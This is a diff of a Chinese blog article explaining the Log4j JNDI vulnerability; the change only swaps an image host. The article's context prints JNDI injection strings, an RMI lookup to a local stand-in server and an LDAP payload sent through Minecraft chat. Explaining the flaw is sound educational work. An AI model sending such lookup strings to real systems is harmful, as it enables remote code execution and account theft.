@@ -733,7 +733,7 @@
 <p>    以上是黑客服务器上运行的代码。所以只需要你电脑上某个 Java 程序运行以下代码:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String log = <span class="string">&quot;$&#123;jndi:rmi//127.0.0.1:1099/heike&#125;&quot;</span>;</span><br><span class="line">logger.info(log);</span><br></pre></td></tr></table></figure>
 <p>    此处的 “log” 可以是玩家说的话，昵称等，不需要程序特定这么写。<br>​</p>
-<p>    就会出现如下状况:<br><img src="https://5nowg0.oss-cn-hangzhou.aliyuncs.com/medias/Log4j%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/0.png" class="lazyload placeholder" data-srcset="https://5nowg0.oss-cn-hangzhou.aliyuncs.com/medias/Log4j%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/0.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"><br>被黑客入侵 (执行了 Heike.class)<br>​</p>
+<p>    就会出现如下状况:<br><img src="http://106.12.125.218/medias/medias/Log4j%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/0.png" class="lazyload placeholder" data-srcset="http://106.12.125.218/medias/medias/Log4j%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/0.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"><br>被黑客入侵 (执行了 Heike.class)<br>​</p>
 <p>    这仅仅是打开了一个信息框，但实际上黑客可以往 Heike.class 放任何代码，在不经意间使你的电脑报废或所有账号全被偷走。</p>
 <h3 id="我的世界JAVA版攻击"><a href="#我的世界JAVA版攻击" class="headerlink" title="我的世界JAVA版攻击"></a>我的世界JAVA版攻击</h3><p>特别是我的世界JAVA版本中，攻击方法超级简单，在游戏的在线聊天中，发送一条带漏洞触发指令的消息，类似<br>“${jndi:ldap://{}.<a target="_blank" rel="noopener" href="http://xxxxxxxxxxxxxx}”,就可以对收到这条消息的用户发起攻击./">http://xxxxxxxxxxxxxx}”,就可以对收到这条消息的用户发起攻击。</a></p>
 <h2 id="如何解决？"><a href="#如何解决？" class="headerlink" title="如何解决？"></a>如何解决？</h2><p>​</p>
